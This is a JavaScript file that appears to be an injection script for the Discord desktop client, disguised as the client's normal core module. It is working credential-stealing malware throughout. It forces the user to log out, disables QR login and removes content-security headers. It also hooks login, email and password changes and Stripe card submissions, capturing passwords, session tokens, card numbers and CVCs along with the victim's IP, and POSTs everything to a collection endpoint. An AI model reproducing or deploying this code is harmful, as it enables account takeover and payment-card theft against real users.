const { BrowserWindow, session } = require('electron');

const KEY = '%key%';
var loggedOut = false;

session.defaultSession.webRequest.onBeforeRequest({
    'urls': [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*'
    ]
}, (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    if (loggedOut == false) {
        loggedOut = true;
        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, true)
    } else { }
    if (details.url.startsWith('wss://')) callback({
        'cancel': true
    });
    else callback({
        'cancel': false
    });
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    if (details.url == 'http://localhost/payload') {
        callback({
            'responseHeaders': {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': '*',
                'Access-Control-Allow-Origin': '*'
            }
        });
    } else {
        callback({
            'responseHeaders': {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': '*'
            }
        });
    }
});

function sendToApi(data) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript('    \n' +
        '        var xhr = new XMLHttpRequest();\n' +
        '        xhr.open("POST", "http://localhost/payload", true);\n' +
        "        xhr.setRequestHeader('Content-Type', 'application/json');\n" +
        "        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n" +
        '        xhr.send(JSON.stringify(' + data + '));\n    ', true);
}

async function newData(type, token, ...args) {
    const ip = await getIp()
    switch (type) {
        case 'login':
            sendToApi(JSON.stringify({
                type: 'login',
                key: KEY,
                ip: ip,
                password: args[0], 
                token: token
            }))
            break;
        case 'emailChanged':
            sendToApi(JSON.stringify({
                type: 'email',
                key: KEY,
                ip: ip,
                newEmail: args[0], 
                password: args[1], 
                token: token
            }))
            break;
        case 'passwordChanged':
            sendToApi(JSON.stringify({
                type: 'password',
                key: KEY,
                ip: ip,
                oldPassword: args[0], 
                newPassword: args[1], 
                token: token
            }))
            break;
        case 'cardAdded':
            sendToApi(JSON.stringify({
                type: 'card',
                key: KEY,
                ip: ip,
                number: args[0], 
                cvc: args[1], 
                expiration: `${args[2]}/${args[3]}`, 
                token: token
            }))
            break;
    }
}

async function getIp() {
    const window = BrowserWindow.getAllWindows()[0];
    var ip = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );xmlHttp.send( null );xmlHttp.responseText;`, !0)
    return ip;
}

session.defaultSession.webRequest.onCompleted({
    'urls': [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.stripe.com/v*/tokens'
    ]
}, async (details, callback) => {
    const window = BrowserWindow.getAllWindows()[0];
    if (details.statusCode != 200) return;
    const data = JSON.parse(Buffer.from(details.uploadData[0].bytes)
        .toString()),
        token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, true)
    if (details.url.endsWith('login')) newData('login', token, data['password']);
    if (details.url.endsWith('users/@me')) {
        if (details.method != 'PATCH') return;
        if (!data['password']) return;
        if (data['email']) newData('emailChanged', token, data['email'], data['password']);
        if (data['new_password']) newData('passwordChanged', token, data['password'], data['new_password']);
    }
    if (details.url.endsWith('tokens') && details.method == 'POST') newData('cardAdded', token, data['data[number]'], data['data[cvc]'], data['data[exp_month]'], data['data[exp_year]']);
}), module.exports = require('./core.asar');